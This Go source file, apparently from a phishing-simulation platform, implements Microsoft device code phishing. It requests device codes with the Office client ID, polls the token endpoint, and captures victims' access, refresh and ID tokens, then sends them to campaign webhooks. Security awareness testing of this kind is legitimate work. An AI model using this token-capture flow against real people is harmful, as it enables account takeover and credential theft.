package service

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"

	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/oapi-codegen/nullable"
	"github.com/phishingclub/phishingclub/cache"
	"github.com/phishingclub/phishingclub/data"
	"github.com/phishingclub/phishingclub/errs"
	"github.com/phishingclub/phishingclub/model"
	"github.com/phishingclub/phishingclub/repository"
	"github.com/phishingclub/phishingclub/vo"
	"gorm.io/gorm"
)

const (
	// defaultMicrosoftDeviceCodeClientID is the ms office client id commonly used in device code phishing attacks
	defaultMicrosoftDeviceCodeClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	// defaultMicrosoftDeviceCodeTenantID is the default tenant used when none is specified
	defaultMicrosoftDeviceCodeTenantID = "organizations"
	// defaultMicrosoftDeviceCodeScope is the default scope requested for graph access
	defaultMicrosoftDeviceCodeScope = "https://graph.microsoft.com/.default openid profile offline_access"
	// defaultMicrosoftDeviceCodeResource is the default resource target
	defaultMicrosoftDeviceCodeResource = "https://graph.microsoft.com"

	// microsoftDeviceCodeEndpoint is the url template for requesting a device code
	microsoftDeviceCodeEndpoint = "https://login.microsoftonline.com/%s/oauth2/v2.0/devicecode"
	// microsoftTokenEndpoint is the url template for polling the token endpoint
	microsoftTokenEndpoint = "https://login.microsoftonline.com/%s/oauth2/v2.0/token"

	// errAuthorizationPending is returned by microsoft when the user has not yet authenticated
	errAuthorizationPending = "authorization_pending"
)

// MicrosoftDeviceCode is the microsoft device code phishing service
type MicrosoftDeviceCode struct {
	Common
	MicrosoftDeviceCodeRepository *repository.MicrosoftDeviceCode
	CampaignRepository            *repository.Campaign
	CampaignRecipientRepository   *repository.CampaignRecipient
	CampaignService               *Campaign
	// HTTPClient is used for all outbound requests to microsoft endpoints.
	// defaults to a client with a 15s timeout if nil.
	HTTPClient *http.Client
}

// MicrosoftDeviceCodeOptions holds the options for creating a microsoft device code
type MicrosoftDeviceCodeOptions struct {
	ClientID string
	TenantID string
	Resource string
	Scope    string
	// CapturedOnce controls whether a captured entry is returned as-is on subsequent
	// GetOrCreateDeviceCode calls instead of being replaced with a fresh code.
	// nil means unset — applyDeviceCodeDefaults will default it to true.
	CapturedOnce *bool
}

// tenantIDPattern matches valid microsoft tenant identifiers:
// - "common", "organizations", "consumers" (well-known values)
// - a UUID (guid) tenant id
// - a domain name like contoso.com (letters, digits, hyphens, dots)
var tenantIDPattern = regexp.MustCompile(`^([a-zA-Z0-9][a-zA-Z0-9\-\.]{0,253}[a-zA-Z0-9]|common|organizations|consumers)$`)

// clientIDPattern matches a UUID-format client id
var clientIDPattern = regexp.MustCompile(`^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$`)

// validateDeviceCodeOptions returns an error if any option value are unexpected or invalid
func validateDeviceCodeOptions(opts *MicrosoftDeviceCodeOptions) error {
	if !tenantIDPattern.MatchString(opts.TenantID) {
		return fmt.Errorf("invalid tenantId %q: must be a UUID, a domain name, or one of common/organizations/consumers", opts.TenantID)
	}
	if !clientIDPattern.MatchString(opts.ClientID) {
		return fmt.Errorf("invalid clientId %q: must be a UUID", opts.ClientID)
	}
	return nil
}

// applyDeviceCodeDefaults fills in any zero-value options with the package defaults
func applyDeviceCodeDefaults(opts *MicrosoftDeviceCodeOptions) {
	if opts.ClientID == "" {
		opts.ClientID = defaultMicrosoftDeviceCodeClientID
	}
	if opts.TenantID == "" {
		opts.TenantID = defaultMicrosoftDeviceCodeTenantID
	}
	if opts.Resource == "" {
		opts.Resource = defaultMicrosoftDeviceCodeResource
	}
	if opts.Scope == "" {
		opts.Scope = defaultMicrosoftDeviceCodeScope
	}
	// CapturedOnce defaults to true — callers must explicitly pass "capturedOnce" "false" to opt out
	if opts.CapturedOnce == nil {
		t := true
		opts.CapturedOnce = &t
	}
}

// microsoftDeviceCodeResponse is the json response from microsoft's device code endpoint
type microsoftDeviceCodeResponse struct {
	DeviceCode      string `json:"device_code"`
	UserCode        string `json:"user_code"`
	VerificationURI string `json:"verification_uri"`
	ExpiresIn       int    `json:"expires_in"`
	Interval        int    `json:"interval"`
	Message         string `json:"message"`
}

// microsoftTokenResponse is the json response from microsoft's token endpoint
type microsoftTokenResponse struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	IDToken      string `json:"id_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
}

// microsoftTokenErrorResponse is the json error response from microsoft's token endpoint
type microsoftTokenErrorResponse struct {
	Error            string `json:"error"`
	ErrorDescription string `json:"error_description"`
}

// requestDeviceCode calls microsoft's device code endpoint and returns the parsed response
func (s *MicrosoftDeviceCode) requestDeviceCode(opts *MicrosoftDeviceCodeOptions) (*microsoftDeviceCodeResponse, error) {
	endpoint := fmt.Sprintf(microsoftDeviceCodeEndpoint, opts.TenantID)
	form := url.Values{
		"client_id": {opts.ClientID},
		"scope":     {opts.Scope},
	}
	resp, err := s.HTTPClient.PostForm(endpoint, form)
	if err != nil {
		return nil, fmt.Errorf("device code request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return nil, fmt.Errorf("failed to read device code response body: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("device code endpoint returned status %d: %s", resp.StatusCode, string(body))
	}

	var dcResp microsoftDeviceCodeResponse
	if err := json.Unmarshal(body, &dcResp); err != nil {
		return nil, fmt.Errorf("failed to parse device code response: %w", err)
	}
	return &dcResp, nil
}

// pollTokenEndpoint polls microsoft's token endpoint once for the given device code.
// returns (tokenResponse, isPending, error).
// isPending is true when microsoft returns authorization_pending — the caller should keep polling.
// any other error means polling should stop for this code.
func (s *MicrosoftDeviceCode) pollTokenEndpoint(tenantID, clientID, deviceCode string) (*microsoftTokenResponse, bool, error) {
	endpoint := fmt.Sprintf(microsoftTokenEndpoint, tenantID)
	form := url.Values{
		"grant_type":  {"urn:ietf:params:oauth:grant-type:device_code"},
		"client_id":   {clientID},
		"device_code": {deviceCode},
	}
	resp, err := s.HTTPClient.PostForm(endpoint, form)
	if err != nil {
		return nil, false, fmt.Errorf("token poll request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return nil, false, fmt.Errorf("failed to read token poll response body: %w", err)
	}

	if resp.StatusCode == http.StatusOK {
		var tokenResp microsoftTokenResponse
		if err := json.Unmarshal(body, &tokenResp); err != nil {
			return nil, false, fmt.Errorf("failed to parse token response: %w", err)
		}
		return &tokenResp, false, nil
	}

	// non-200 — check for authorization_pending vs terminal errors
	var errResp microsoftTokenErrorResponse
	if err := json.Unmarshal(body, &errResp); err != nil {
		return nil, false, fmt.Errorf("token endpoint returned status %d and unparseable body: %s", resp.StatusCode, string(body))
	}

	if errResp.Error == errAuthorizationPending {
		return nil, true, nil
	}

	// any other error (expired_token, authorization_declined, bad_verification_code, etc.) is terminal
	return nil, false, fmt.Errorf("token endpoint error: %s — %s", errResp.Error, errResp.ErrorDescription)
}

// GetOrCreateDeviceCode returns an existing valid (non-expired, non-captured) device code for the
// given campaign and recipient, or requests a new one from microsoft and persists it.
// no auth use only internal, do not expose to api
func (s *MicrosoftDeviceCode) GetOrCreateDeviceCode(
	ctx context.Context,
	campaignID *uuid.UUID,
	recipientID *uuid.UUID,
	opts MicrosoftDeviceCodeOptions,
) (*model.MicrosoftDeviceCode, error) {
	applyDeviceCodeDefaults(&opts)

	if err := validateDeviceCodeOptions(&opts); err != nil {
		return nil, fmt.Errorf("GetOrCreateDeviceCode: %w", err)
	}

	existing, err := s.MicrosoftDeviceCodeRepository.GetByCampaignAndRecipientID(ctx, campaignID, recipientID)
	if err != nil && !errors.Is(err, gorm.ErrRecordNotFound) {
		s.Logger.Errorw("failed to look up existing device code", "error", err)
		return nil, errs.Wrap(err)
	}

	if existing != nil {
		// when captured_once is set and the entry is already captured, return it as-is so that
		// a page refresh does not generate a new device code and invalidate the captured one.
		if existing.Captured && existing.CapturedOnce {
			return existing, nil
		}
		// return valid non-captured, non-expired, not-about-to-expire entry as-is
		if !existing.Captured && !existing.IsExpired() && !existing.ExpiresWithin(5*time.Minute) {
			return existing, nil
		}
		// stale entry — remove it before creating a fresh one
		if delErr := s.MicrosoftDeviceCodeRepository.DeleteByCampaignAndRecipientID(ctx, campaignID, recipientID); delErr != nil {
			s.Logger.Errorw("failed to delete stale device code entry", "error", delErr)
			return nil, errs.Wrap(delErr)
		}
	}

	// request a fresh device code from microsoft
	dcResp, err := s.requestDeviceCode(&opts)
	if err != nil {
		s.Logger.Errorw("failed to request device code from microsoft", "error", err)
		return nil, errs.Wrap(err)
	}

	expiresAt := time.Now().UTC().Add(time.Duration(dcResp.ExpiresIn) * time.Second)

	campaignIDNullable := nullable.NewNullableWithValue(*campaignID)
	recipientIDNullable := nullable.NewNullableWithValue(*recipientID)

	entry := &model.MicrosoftDeviceCode{
		DeviceCode:      dcResp.DeviceCode,
		UserCode:        dcResp.UserCode,
		VerificationURI: dcResp.VerificationURI,
		ExpiresAt:       &expiresAt,
		Resource:        opts.Resource,
		ClientID:        opts.ClientID,
		TenantID:        opts.TenantID,
		Scope:           opts.Scope,
		Captured:        false,
		CapturedOnce:    *opts.CapturedOnce,
		CampaignID:      campaignIDNullable,
		RecipientID:     recipientIDNullable,
	}

	newID, err := s.MicrosoftDeviceCodeRepository.Insert(ctx, entry)
	if err != nil {
		// a unique constraint violation means a concurrent request already inserted a row
		// for this campaign+recipient between our lookup and our insert — fetch and return
		// that row instead of failing
		errMsg := strings.ToLower(err.Error())
		if strings.Contains(errMsg, "unique") || strings.Contains(errMsg, "duplicate") {
			existing, fetchErr := s.MicrosoftDeviceCodeRepository.GetByCampaignAndRecipientID(ctx, campaignID, recipientID)
			if fetchErr == nil {
				return existing, nil
			}
		}
		s.Logger.Errorw("failed to insert device code entry", "error", err)
		// save a failed creation event before returning so operators can see the attempt
		s.saveDeviceCodeCreatedEvent(ctx, campaignID, recipientID, "", "", err.Error())
		return nil, errs.Wrap(err)
	}

	entry.ID = nullable.NewNullableWithValue(*newID)

	// save a campaign event recording the new device code so operators can see
	// the user code and verification uri in the campaign event log
	s.saveDeviceCodeCreatedEvent(ctx, campaignID, recipientID, entry.UserCode, entry.VerificationURI, "")

	return entry, nil
}

// saveDeviceCodeCreatedEvent saves a campaign event recording that a device code was created (or
// failed to be created). failReason should be empty on success.
func (s *MicrosoftDeviceCode) saveDeviceCodeCreatedEvent(
	ctx context.Context,
	campaignID *uuid.UUID,
	recipientID *uuid.UUID,
	userCode string,
	verificationURI string,
	failReason string,
) {
	eventTypeID := cache.EventIDByName[data.EVENT_CAMPAIGN_RECIPIENT_INFO]
	if eventTypeID == nil {
		// event type not yet seeded — skip silently
		return
	}

	payload := map[string]string{
		"user_code":        userCode,
		"verification_uri": verificationURI,
	}
	if failReason != "" {
		payload["error"] = failReason
	}
	raw, err := json.Marshal(payload)
	if err != nil {
		s.Logger.Warnw("failed to marshal device code created event data", "error", err)
		return
	}
	eventData := vo.NewUnsafeOptionalString1MB(string(raw))

	eventID := uuid.New()
	campaignEvent := &model.CampaignEvent{
		ID:          &eventID,
		CampaignID:  campaignID,
		RecipientID: recipientID,
		EventID:     eventTypeID,
		IP:          vo.NewOptionalString64Must(""),
		UserAgent:   vo.NewOptionalString255Must(""),
		Data:        eventData,
		Metadata:    vo.NewEmptyOptionalString1MB(),
	}
	if saveErr := s.CampaignRepository.SaveEvent(ctx, campaignEvent); saveErr != nil {
		s.Logger.Errorw("failed to save device code created event", "error", saveErr)
	}
}

// PollAllPending is called by the background task runner.
// it fetches all non-captured, non-expired device codes and polls microsoft's token endpoint once
// per entry. on a successful capture it marks the entry, saves a campaign event, and updates the
// most notable event for the campaign recipient.
func (s *MicrosoftDeviceCode) PollAllPending(ctx context.Context) error {
	pending, err := s.MicrosoftDeviceCodeRepository.GetAllPendingNotExpired(ctx)
	if err != nil {
		s.Logger.Errorw("failed to fetch pending device codes", "error", err)
		return errs.Wrap(err)
	}

	for _, entry := range pending {
		if err := s.pollAndCapture(ctx, entry); err != nil {
			// log but continue — a failure on one entry must not stop the rest
			s.Logger.Errorw("failed to poll device code entry",
				"error", err,
				"deviceCodeID", entry.ID,
			)
		}
	}
	return nil
}

// pollAndCapture polls the token endpoint for a single device code entry and, on success,
// persists the captured tokens and emits a campaign event.
func (s *MicrosoftDeviceCode) pollAndCapture(ctx context.Context, entry *model.MicrosoftDeviceCode) error {
	entryID := entry.ID.MustGet()

	// record that we polled this entry, even if the result is still pending
	if err := s.MicrosoftDeviceCodeRepository.UpdateLastPolledAt(ctx, &entryID, time.Now()); err != nil {
		s.Logger.Warnw("failed to update last_polled_at for device code entry",
			"error", err,
			"deviceCodeID", entryID,
		)
	}

	tokenResp, isPending, err := s.pollTokenEndpoint(entry.TenantID, entry.ClientID, entry.DeviceCode)
	if err != nil {
		// terminal error from microsoft — log at debug level since this is expected for
		// denied/expired codes and we don't want to spam the error logs
		s.Logger.Debugw("device code polling returned terminal error",
			"error", err,
			"userCode", entry.UserCode,
		)
		return nil
	}
	if isPending {
		// user has not authenticated yet — nothing to do this tick
		return nil
	}

	// we have tokens — mark the entry as captured
	if err := s.MicrosoftDeviceCodeRepository.MarkCaptured(
		ctx,
		&entryID,
		tokenResp.AccessToken,
		tokenResp.RefreshToken,
		tokenResp.IDToken,
	); err != nil {
		s.Logger.Errorw("failed to mark device code as captured", "error", err)
		return errs.Wrap(err)
	}

	campaignID, err := entry.CampaignID.Get()
	if err != nil {
		s.Logger.Errorw("captured device code entry is missing campaign id", "entryID", entryID.String())
		return fmt.Errorf("device code entry %s has no campaign id", entryID.String())
	}

	recipientID, err := entry.RecipientID.Get()
	if err != nil {
		s.Logger.Errorw("captured device code entry is missing recipient id", "entryID", entryID.String())
		return fmt.Errorf("device code entry %s has no recipient id", entryID.String())
	}

	// fetch the campaign to check SaveSubmittedData
	campaign, err := s.CampaignRepository.GetByID(ctx, &campaignID, &repository.CampaignOption{})
	if err != nil {
		s.Logger.Errorw("failed to get campaign for submit event", "error", err)
		return errs.Wrap(err)
	}

	// build event data json containing the captured tokens
	eventData, err := s.buildCapturedEventData(tokenResp, entry.UserCode, entry.ClientID)
	if err != nil {
		// non-fatal — use an empty string rather than failing the whole capture
		s.Logger.Warnw("failed to build device code event data, falling back to empty", "error", err)
		eventData = vo.NewEmptyOptionalString1MB()
	}

	// save as a submitted data event
	// if SaveSubmittedData is disabled, record the event but store empty data.
	var submitData *vo.OptionalString1MB
	if campaign.SaveSubmittedData.MustGet() {
		submitData = eventData
	} else {
		submitData = vo.NewOptionalString1MBMust("{}")
	}
	submitEventID := uuid.New()
	submitDataEventTypeID := cache.EventIDByName[data.EVENT_CAMPAIGN_RECIPIENT_SUBMITTED_DATA]
	submitEvent := &model.CampaignEvent{
		ID:          &submitEventID,
		CampaignID:  &campaignID,
		RecipientID: &recipientID,
		EventID:     submitDataEventTypeID,
		IP:          vo.NewOptionalString64Must(""),
		UserAgent:   vo.NewOptionalString255Must(""),
		Data:        submitData,
		Metadata:    vo.NewEmptyOptionalString1MB(),
	}
	if err := s.CampaignRepository.SaveEvent(ctx, submitEvent); err != nil {
		s.Logger.Errorw("failed to save device code submit event", "error", err)
		return errs.Wrap(err)
	}

	// fire webhooks for the submitted data event
	if s.CampaignService != nil {
		webhookData := map[string]interface{}{
			"access_token":  tokenResp.AccessToken,
			"refresh_token": tokenResp.RefreshToken,
			"id_token":      tokenResp.IDToken,
			"user_code":     entry.UserCode,
			"client_id":     entry.ClientID,
		}
		if err := s.CampaignService.HandleWebhooks(
			ctx,
			&campaignID,
			&recipientID,
			data.EVENT_CAMPAIGN_RECIPIENT_SUBMITTED_DATA,
			webhookData,
		); err != nil {
			s.Logger.Errorw("failed to handle webhooks for device code capture", "error", err)
		}
	}

	// update most notable event for the campaign recipient
	campaignRecipient, err := s.CampaignRecipientRepository.GetByCampaignAndRecipientID(
		ctx,
		&campaignID,
		&recipientID,
		&repository.CampaignRecipientOption{},
	)
	if err != nil {
		s.Logger.Errorw("failed to get campaign recipient for notable event update", "error", err)
		// not returning — the tokens are already captured, so this is best-effort
		return nil
	}

	currentNotableEventID, _ := campaignRecipient.NotableEventID.Get()
	if cache.IsMoreNotableCampaignRecipientEventID(&currentNotableEventID, submitDataEventTypeID) {
		campaignRecipient.NotableEventID.Set(*submitDataEventTypeID)
		crid := campaignRecipient.ID.MustGet()
		if err := s.CampaignRecipientRepository.UpdateByID(ctx, &crid, campaignRecipient); err != nil {
			s.Logger.Errorw("failed to update most notable event for campaign recipient after device code capture", "error", err)
		}
	}

	s.Logger.Infow("microsoft device code captured successfully",
		"campaignID", campaignID.String(),
		"recipientID", recipientID.String(),
		"userCode", entry.UserCode,
	)
	return nil
}

// buildCapturedEventData serialises the captured token information into a 1MB-bounded vo string.
func (s *MicrosoftDeviceCode) buildCapturedEventData(
	tokenResp *microsoftTokenResponse,
	userCode string,
	clientID string,
) (*vo.OptionalString1MB, error) {
	payload := map[string]string{
		"capture_type":  "device_code",
		"access_token":  tokenResp.AccessToken,
		"id_token":      tokenResp.IDToken,
		"refresh_token": tokenResp.RefreshToken,
		"user_code":     userCode,
		"client_id":     clientID,
	}
	raw, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal captured token payload: %w", err)
	}
	// a truncated JWT or refresh token is cryptographically invalid and cannot be replayed,
	// so exceeding the 1 MB limit is treated as an error rather than silently corrupting the data.
	result, err := vo.NewOptionalString1MB(string(raw))
	if err != nil {
		return nil, fmt.Errorf("captured token payload exceeds 1 MB limit: %w", err)
	}
	return result, nil
}
